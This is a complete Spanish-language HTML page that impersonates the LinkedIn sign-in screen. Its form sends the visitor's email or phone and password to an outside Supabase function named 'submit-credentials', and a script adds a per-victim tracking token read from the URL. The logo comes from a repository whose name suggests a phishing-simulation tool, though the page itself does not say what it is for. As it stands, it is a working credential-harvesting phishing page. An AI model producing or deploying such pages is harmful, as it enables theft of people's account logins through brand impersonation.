<!doctype html>
<html lang="es"><head><meta charset="utf-8">
<title>LinkedIn - Iniciar sesión</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
  *{box-sizing:border-box}
  body{margin:0;background:#f3f2ef;font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif;color:#000;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
  .box{background:#fff;width:100%;max-width:400px;padding:28px;border-radius:8px;box-shadow:0 0 0 1px rgba(0,0,0,0.06),0 2px 4px rgba(0,0,0,0.08)}
  .logo{height:34px;margin-bottom:18px;display:block}
  h1{font-weight:600;font-size:24px;margin:0 0 6px}
  .sub{font-size:14px;color:#666;margin:0 0 24px}
  label{display:block;font-size:14px;color:#000;margin:0 0 6px;font-weight:600}
  input{width:100%;padding:12px;font-size:16px;border:1px solid rgba(0,0,0,0.6);border-radius:4px;outline:none;font-family:inherit;margin-bottom:16px;background:#fff}
  input:focus{border-color:#0A66C2;box-shadow:inset 0 0 0 1px #0A66C2}
  button{display:block;width:100%;background:#0A66C2;color:#fff;border:none;padding:13px;font-size:16px;font-weight:600;border-radius:24px;cursor:pointer;font-family:inherit;margin-top:8px}
  button:hover{background:#084d92}
  .hint{font-size:14px;color:#666;margin-top:16px;text-align:center}
  a{color:#0A66C2;text-decoration:none;font-weight:600}
  a:hover{text-decoration:underline}
</style></head>
<body>
<div class="box">
  <img class="logo" src="https://cdn.jsdelivr.net/gh/mikel-santisteban/deceptics-email-assets@main/linkedin.png" alt="LinkedIn">
  <h1>Iniciar sesión</h1>
  <p class="sub">Mantente al día con tu mundo profesional.</p>
  <form action="https://amjshbgyuazrtxrokqwy.supabase.co/functions/v1/submit-credentials" method="POST">
    <input type="hidden" name="token" id="token-field">
    <label>Email o teléfono</label>
    <input type="text" name="email" required autofocus>
    <label>Contraseña</label>
    <input type="password" name="password" required>
    <button type="submit">Iniciar sesión</button>
  </form>
  <p class="hint">¿Eres nuevo en LinkedIn? <a href="#">Únete ahora</a></p>
</div>
<script>document.getElementById('token-field').value=new URLSearchParams(location.search).get('t')||'';</script>
</body></html>
